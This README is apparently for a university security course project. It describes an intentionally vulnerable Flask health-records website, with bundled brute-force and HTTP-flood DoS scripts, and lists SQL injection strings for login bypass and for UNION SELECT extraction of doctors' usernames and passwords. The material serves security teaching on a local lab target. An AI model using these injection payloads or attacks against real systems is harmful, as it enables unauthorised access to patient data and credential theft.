# ELEC0138 Security and Privacy 23/24 Group_S

## Description
This EHR website base version folder contains the original version of the web application. It suffers from brute force attack, DOS attack and SQL injection attacks. 

### Three attacks to be implemented in this application:  
1. Brute force attack
2. Dos attack (HTTP flooding)
3. SQL injection attack

## Program structure
-- EHR website base version
```
- instance
- templates
- app.py
- bruteforce.py
- dictionary.txt
- dos.py
- README.md
```
- `instance/`: Contain the database file that stores the information of patients and doctors.
- `templates/`: The original version of the EHR website without denfence.
- `app.py`:  Set up the web application using Flask and SQLAlchemy, including user authentication features and database interactions.
- `bruteforce.py`: The file to implement brute force attack to obtain the password.
- `dictionary.txt`: Contains the possible passwords to be tested by bruteforce.py file.
- `dos.py`: The file to implement dos attack to crash the website.
- `README.md`:The README file for the applications in the original website.

## Program run instruction
1. Clone the repository
2. Create a new Python env with version 3.9 and install the dependencies with requirement.txt
3. Navigate to this folder and run the app.py via the "flask run" instruction to open the website.
4. Run bruteforce.py to run the brute force.
5. Run dos.py to run the dos attack.
6. Use SQL injection inputs below to do SQL injection attacks

### SQL injection inputs
Copy the content within <<>>

Login bypass:
1. Username and password  <<' OR '1'='1>>
2. only use username <<yaoming' -->>   without knowing the password
3. use username <<admin' UNION SELECT * FROM Doctor -->> without knowing the password

Patient search (after login):
1. <<' OR '1'='1>>: get all patient data without name
2. <<UNION SELECT password, username FROM Doctor -->>:  get all usernames
3. <<UNION SELECT username, password FROM Doctor -->>: get all user passwords

 

